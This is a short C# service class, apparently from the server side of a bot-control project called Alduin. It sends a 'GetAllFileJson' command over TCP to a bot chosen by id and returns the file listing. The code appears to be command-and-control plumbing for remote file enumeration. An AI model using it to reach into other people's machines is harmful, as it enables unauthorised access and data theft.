using Alduin.Logic.Mediator.Queries;
using Alduin.Server.Commands;
using Alduin.Server.Handler;
using MediatR;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Text;
using System.Threading.Tasks;

namespace Alduin.Server.Services
{
    public class GetAllSourceFileService
    {
        private readonly IMediator _mediator;

        public GetAllSourceFileService(IMediator mediator)
        {
            _mediator = mediator;
        }
        public async Task<string> GetAllFile(int botid)
        {
            var method = new BaseCommands
            {
                Method = "GetAllFileJson"
            };
            var bot = new GetBotByIdQuery
            {
                Id = botid
            };
            var botlist = await _mediator.Send(bot);
            var response = CommandExecute.TcpConnects(botlist, JsonConvert.SerializeObject(method));
            return response;
        }
    }
}
